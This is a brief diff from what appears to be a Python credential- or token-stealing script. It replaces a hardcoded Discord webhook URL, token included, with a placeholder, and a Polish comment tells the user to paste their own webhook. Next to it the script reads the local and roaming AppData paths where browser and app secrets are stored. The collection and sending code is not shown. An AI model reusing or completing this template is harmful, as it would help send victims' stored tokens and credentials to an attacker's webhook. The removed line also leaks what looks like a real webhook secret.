@@ -12,7 +12,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/906879374253522954/2iB2N7DQkSdMwwjGbuMUCTFpFKJpphy5QDMz6rjVFidPEmPM3i5vWVak08mHxLx1j8Sl" # tu wklej webhooka
+WEBHOOK_URL = "----" # zamiast ,,----" wklej webhooka
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
